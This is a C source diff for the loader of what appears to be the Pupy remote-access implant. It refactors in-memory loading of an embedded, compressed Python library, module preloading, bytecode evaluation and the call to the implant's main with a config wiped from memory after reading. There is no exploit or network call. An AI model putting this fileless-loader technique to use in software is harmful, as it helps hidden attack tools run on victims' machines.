@@ -19,6 +19,16 @@ static char __config__[262144] = "####---PUPY_CONFIG_COMES_HERE---####\n";
 static PyGILState_STATE restore_state;
 static BOOL is_initialized = FALSE;
 
+/* Likely-to-be-used modules */
+static const char *preload_modules[] = {
+    "__future__",
+    "types",
+    "linecache",
+    "traceback",
+    "_weakrefset",
+    "abc",
+    NULL
+};
 
 #include "lzmaunpack.c"
 #include "library.c"
@@ -82,7 +92,7 @@ BOOL initialize_python(int argc, char *argv[], BOOL is_shared_object) {
 
             continue;
         }
-        
+
         dprint("Loading %s\n", dependency->name);
 
         hModule = xz_dynload(
@@ -179,27 +189,245 @@ lbExit1:
     return FALSE;
 }
 
+static
+size_t last_chr_offt(const char *cstr, char chr) {
+    int found_any = 0;
+    size_t last_found = 0;
+    size_t offt;
+
+    for (offt=0; cstr && cstr[offt]; offt++) {
+        if (cstr[offt] == chr) {
+            found_any = 1;
+            last_found = offt;
+        }
+    }
+
+    if (found_any)
+        return last_found;
+    else
+        return offt;
+}
+
+static
+PyObject *py_eval_package_init(
+    const char *name, PyObject *co_code, const char *vpath, const char *path, int is_package) {
+
+    PyObject *new_module;
+    PyObject *new_module_dict;
+    PyObject *builtins;
+    PyObject *py_eval_result;
+
+    new_module = PyImport_AddModule(name);
+    if (!new_module) {
+        dprint(
+            "py_eval_package_init(%s) - PyImport_AddModule failed\n", name
+        );
+
+        return NULL;
+    }
+
+    new_module_dict = PyModule_GetDict(new_module);
+
+    PyObject_SetAttrString(
+        new_module, "__file__", PyString_FromString(vpath));
+
+    dprint(
+        "py_eval_package_init(%s) %p.__file__ = %s\n",
+        name, new_module, vpath
+    );
+
+    PyObject_SetAttrString(
+        new_module, "__package__", PyString_FromString(name));
+
+    dprint(
+        "py_eval_package_init(%s) %p.__package__ = %s\n",
+        name, new_module, name
+    );
+
+    if (is_package) {
+        PyObject *py_vpath = PyString_FromStringAndSize(
+            vpath, last_chr_offt(vpath, '/'));
+
+        PyObject_SetAttrString(
+            new_module, "__path__", Py_BuildValue("[O]", py_vpath));
+
+        Py_DecRef(py_vpath);
+
+        dprint(
+            "py_eval_package_init(%s) %p.__path__ = [%s] (refs=%d)\n",
+            name, new_module, PyString_AsString(py_vpath), Py_RefCnt(py_vpath)
+        );
+    }
+
+    builtins = PyEval_GetBuiltins();
+    Py_IncRef(builtins);
+    PyDict_SetItemString(new_module_dict, "__builtins__", builtins);
+
+    dprint(
+        "py_eval_package_init(%s) %p.__dict__['__builtins__'] = %p (refcnt=%d)\n",
+        name, new_module, builtins, Py_RefCnt(builtins)
+    );
+
+    py_eval_result = PyEval_EvalCode(
+        co_code, new_module_dict, new_module_dict);
+
+    if (!py_eval_result) {
+        // FIXME: Delete from sys.modules (?)
+        return NULL;
+    }
+
+    Py_DecRef(py_eval_result);
+
+    dprint(
+        "py_eval_package_init(%s) -> builtins %p (refcnt=%d)\n",
+        name, builtins, Py_RefCnt(builtins)
+    );
+
+    dprint(
+        "py_eval_package_init(%s) -> %p (refcnt=%d) __dict__ %p (refcnt=%d) co_code %p (refcnt=%d)\n",
+        name,
+        new_module, Py_RefCnt(new_module),
+        new_module_dict, Py_RefCnt(new_module_dict),
+        co_code, Py_RefCnt(co_code)
+    );
+
+    return new_module;
+}
+
+static
+PyObject* py_module_from_stdlib(PyObject *py_stdlib, const char *name, int is_init) {
+    PyObject *module = NULL;
+    PyObject *pybody = NULL;
+    PyObject *pybytecode = NULL;
+
+    char *pybody_c_ptr = NULL;
+    Py_ssize_t pybody_c_size = 0;
+
+    char *vpath_name = NULL;
+    char *path_name = NULL;
+
+    // pupy:// name /__init__.pyo
+    // OR
+    // pupy:// name .pyo
+
+    size_t vpath_len =
+        strlen(name)
+        + sizeof(VPATH_EXT) - 1
+        + sizeof(VPATH_PREFIX) - 1
+        + (is_init? sizeof("/__init__") - 1: 0)
+        + 1
+        ;
+
+    vpath_name = (char *) OSAlloc(vpath_len);
+    if (!vpath_name)
+        goto lbMemFailure1;
+
+    memset(vpath_name, '\0', vpath_len);
+    strcpy(vpath_name, VPATH_PREFIX);
+    strcat(vpath_name, name);
+    if (is_init)
+        strcat(vpath_name, "/__init__" VPATH_EXT);
+    else
+        strcat(vpath_name, VPATH_EXT);
+
+    // same string without pupy://
+    path_name = vpath_name + sizeof(VPATH_PREFIX) - 1;
+
+    pybody = PyDict_GetItemString(py_stdlib, path_name);
+    if (!pybody) {
+        dprint(
+            "py_module_from_library(%s, %d) -> %s (%s) not found in stdlib\n",
+            name, is_init, path_name, vpath_name
+        );
+
+        PyErr_SetString(PyExc_ImportError, name);
+        goto lbFreeVpath;
+    }
+
+    dprint(
+        "py_module_from_library(%s, %d) -> %s found -> %p\n",
+        name, is_init, path_name, pybody
+    );
+
+    if (PyString_AsStringAndSize(pybody, &pybody_c_ptr, &pybody_c_size) == -1) {
+        dprint(
+            "py_module_from_library(%s, %d) -> %s -> Invalid type?\n",
+            name, is_init, path_name
+        );
+
+        goto lbFreeVpath;
+    }
+
+    dprint(
+        "py_module_from_library(%s, %d) -> %s (%p) -> bytecode=%p size=%d\n",
+        name, is_init, path_name, pybody,
+        pybody_c_ptr, pybody_c_size
+    );
+
+    pybytecode = PyMarshal_ReadObjectFromString(
+        pybody_c_ptr + 8, pybody_c_size - 8
+    );
+
+    if (!pybytecode) {
+        dprint(
+            "py_module_from_library(%s, %d) -> %s -> Invalid type (marshall error)?\n",
+            name, is_init, path_name
+        );
+
+        goto lbFreeVpath;
+    }
+
+    dprint(
+        "py_module_from_library(%s, %d) -> %s (%p) -> bytecode=%p size=%d -> Unmarshalled -> %p\n",
+        name, is_init, path_name, pybody,
+        pybody_c_ptr, pybody_c_size,
+        pybytecode
+    );
+
+    // It's worth to continue
+    module = py_eval_package_init(name, pybytecode, vpath_name, path_name, is_init);
+    if (!module) {
+        dprint("py_module_from_library(%s, %d) -> Eval failed\n", name, is_init);
+        PyErr_Print();
+        goto lbFreePyBytecode;
+    }
+
+    dprint("py_module_from_library(%s, %d) -> %p\n", name, is_init, module);
+
+    PyDict_DelItemString(py_stdlib, path_name);
+
+lbFreePyBytecode:
+    Py_DecRef(pybytecode);
+
+lbFreeVpath:
+    OSFree(vpath_name);
+
+    return module;
+
+lbMemFailure1:
+    return PyErr_NoMemory();
+}
+
+
 void run_pupy() {
     union {
         unsigned int l;
         unsigned char c[4];
     } len;
 
+    PyObject *pupy;
+    PyObject *future;
+
     PyObject *py_config_list;
-    PyObject *py_config;
     PyObject *py_pupylib;
     PyObject *py_stdlib;
-    PyObject *pupy;
     PyObject *pupy_dict;
-    PyObject *pupy_init;
-    PyObject *pupy_init_bytecode;
-    PyObject *py_eval_result;
-    PyObject *py_builtins;
     PyObject *py_debug;
     PyObject *py_main;
+    PyObject *py_eval_result;
+    PyObject *py_config = NULL;
 
-    char *pupy_init_bytecode_c;
-    Py_ssize_t pupy_init_bytecode_c_size;
+    const char **preload_module = NULL;
 
     dprint("Load config\n");
     len.c[3] = __config__[0];
@@ -218,16 +446,16 @@ void run_pupy() {
     dprint("Config parcel unpacked: %p\n", py_config_list);
     if (!py_config_list) {
         dprint("Config unpack failed\n");
-        goto lbExit2;
+        goto lbExit1;
     }
 
     dprint("Cleanup config\n");
     memset(__config__, 0xFF, len.l + 4);
-    
+
     dprint("Stdlib size: %d\n", library_c_size);
     py_stdlib = PyDict_lzmaunpack(library_c_start, library_c_size);
     if (!py_stdlib) {
-        goto lbExit3;
+        goto lbExit2;
     }
 
     dprint("Stdlib unpacked: %p\n", py_stdlib);
@@ -248,86 +476,41 @@ void run_pupy() {
 
     Py_IncRef(py_config);
 
-    Py_DecRef(py_config_list);
-
-    pupy = PyImport_AddModule("pupy");
-    dprint("Add pupy module: %p\n", pupy);
-
-    dprint("Set pupy module base arguments..\n");
-    PyObject_SetAttrString(
-        pupy, "__file__", PyString_FromString("pupy://pupy/__init__.pyo"));
-    PyObject_SetAttrString(
-        pupy, "__package__", PyString_FromString("pupy"));
-    PyObject_SetAttrString(
-        pupy, "__path__", Py_BuildValue("[s]", "pupy://pupy"));
-    dprint("Set pupy module base arguments.. done\n");
-
-    pupy_init = PyDict_GetItemString(py_stdlib, "pupy/__init__.pyo");
-
-    dprint("pupy/__init__.pyo at %p\n", pupy_init);
-
-    Py_IncRef(pupy_init);
-    PyDict_DelItem(py_stdlib, pupy_init);
-
-    PyString_AsStringAndSize(
-        pupy_init, &pupy_init_bytecode_c, &pupy_init_bytecode_c_size);
-
-    dprint(
-        "pupy/__init__.pyo bytecode=%p size=%d\n",
-        pupy_init_bytecode_c, pupy_init_bytecode_c_size);
-
-    pupy_init_bytecode = PyMarshal_ReadObjectFromString(
-        pupy_init_bytecode_c + 8, pupy_init_bytecode_c_size - 8
-    );
-
-    Py_DecRef(pupy_init);
-
-    dprint("Unmarshalled bytecode: %p\n", pupy_init_bytecode);
-
-    pupy_dict = PyModule_GetDict(pupy);
-    Py_IncRef(pupy_dict);
-
-    py_builtins = PyEval_GetBuiltins();
-    dprint("Builtins at %p\n", py_builtins);
-
-    PyDict_SetItemString(pupy_dict, "__builtins__", py_builtins);
-
-    dprint("Evaluate pupy bytecode: %p -> %p\n", pupy_init_bytecode, pupy_dict);
-    py_eval_result = PyEval_EvalCode(
-        pupy_init_bytecode, pupy_dict, pupy_dict);
-    Py_DecRef(pupy_dict);
-    dprint("Evaluation completed: %p\n", py_eval_result);
-
-    Py_DecRef(pupy_init_bytecode);
-
-    if (!py_eval_result) {
-        PyErr_Print();
-    } else {
-        Py_DecRef(py_eval_result);
+    dprint("Preload basic modules\n");
+    for (preload_module=preload_modules; *preload_module; preload_module ++) {
+        if (!py_module_from_stdlib(py_stdlib, *preload_module, 0))
+            goto lbExit4;
     }
 
-    dprint("Call pupy.run\n");
+    dprint("Loading pupy\n");
+    pupy = py_module_from_stdlib(py_stdlib, "pupy", 1);
+    if (!pupy)
+        goto lbExit4;
 
+    pupy_dict = PyModule_GetDict(pupy);
     py_main = PyDict_GetItemString(pupy_dict, "main");
+
+    if (!py_main) {
+        dprint("pupy.main not found\n");
+        goto lbExit3;
+    }
+
 #ifdef DEBUG
     py_debug = PyBool_FromLong(1);
 #else
     py_debug = PyBool_FromLong(0);
 #endif
 
-    Py_IncRef(py_main);
-
     dprint(
-        "Call pupy.run: %p(%p, %p, %p)\n",
+        "Call pupy.main: %p(%p, %p, %p)\n",
         py_main, Py_None, py_debug, py_config
     );
 
+    Py_IncRef(py_main);
     Py_IncRef(Py_None);
+
     py_eval_result = PyObject_CallFunctionObjArgs(
         py_main, Py_None, py_debug, py_config, py_stdlib, NULL);
-
-    Py_DecRef(py_main);
-    Py_DecRef(Py_None);
 
     if (!py_eval_result) {
         PyErr_Print();
@@ -335,13 +518,19 @@ void run_pupy() {
         Py_DecRef(py_eval_result);
     }
 
-    dprint("Completed\n");
+    Py_DecRef(py_main);
+    Py_DecRef(Py_None);
+
+    dprint("Completed (py_eval_result: %p)\n", py_eval_result);
+
+lbExit4:
+    Py_DecRef(py_config);
 
 lbExit3:
-    Py_DecRef(py_stdlib);
+    Py_DecRef(py_config_list);
 
 lbExit2:
-    Py_DecRef(py_config);
+    Py_DecRef(py_stdlib);
 
 lbExit1:
     dprint("Exit\n");
@@ -351,4 +540,11 @@ void deinitialize_python() {
     dprint("Deinitialize python\n");
     PyGILState_Release(restore_state);
     Py_Finalize();
+}
+
+int Py_RefCnt(const PyObject *object) {
+    if (!object)
+        return -1;
+
+    return *((int *) object);
 }
